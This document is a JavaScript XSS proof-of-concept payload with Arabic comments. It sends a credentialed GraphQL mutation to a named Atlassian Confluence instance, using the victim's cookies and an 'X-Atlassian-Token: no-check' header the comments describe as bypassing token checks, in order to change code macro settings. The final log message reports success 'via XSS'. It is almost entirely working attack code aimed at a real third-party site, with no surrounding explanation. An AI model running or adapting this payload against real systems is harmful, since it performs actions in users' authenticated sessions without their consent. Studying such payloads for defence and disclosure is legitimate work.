function updateCodeMacroConfig() {
  var xhttp = new XMLHttpRequest();
  // المسار المستخرج من طلبك
  var url = "https://anshall.atlassian.net/cgraphql?q=ConfigureCodeMacroPageUpdateMutation";

  xhttp.open("POST", url, true);

  // إعداد الرؤوس (Headers) الضرورية لضمان قبول الطلب
  xhttp.setRequestHeader("Content-type", "application/json");
  xhttp.setRequestHeader("Accept", "*/*");
  xhttp.setRequestHeader("X-Apollo-Operation-Name", "ConfigureCodeMacroPageUpdateMutation");
  xhttp.setRequestHeader("Atl-Agg-Confluence-Mutationerror-Compat", "false");
  
  // تجاوز التحقق من التوكن يدوياً لأننا داخل المتصفح
  xhttp.setRequestHeader("X-Atlassian-Token", "no-check");

  // تفعيل إرسال الكوكيز (بما فيها المحمية) تلقائياً
  xhttp.withCredentials = true;

  // بناء البيانات (Payload) بناءً على طلبك
  var data = JSON.stringify([{
    "operationName": "ConfigureCodeMacroPageUpdateMutation",
    "variables": {
      "input": {
        "themeName": "Django", // تغيير الثيم لـ Django كتجربة
        "languageName": "Javascript" // تغيير اللغة الافتراضية
      }
    },
    "query": "mutation ConfigureCodeMacroPageUpdateMutation($input: ConfluenceUpdateNewCodeMacroInput!) {\n  confluence {\n    updateNewCodeMacro(input: $input) {\n      errors {\n        message\n        __typename\n      }\n      success\n      __typename\n    }\n    __typename\n  }\n}\n"
  }]);

  xhttp.onreadystatechange = function() {
    if (this.readyState == 4) {
      console.log("Code Macro Update Status: " + this.status);
      console.log("Response JSON: " + this.responseText);
      
      if (this.responseText.includes('"success":true')) {
        console.log("✅ Code Macro settings updated via XSS!");
      } else {
        console.log("❌ Update failed. Check response for details.");
      }
    }
  };

  xhttp.send(data);
}

updateCodeMacroConfig();
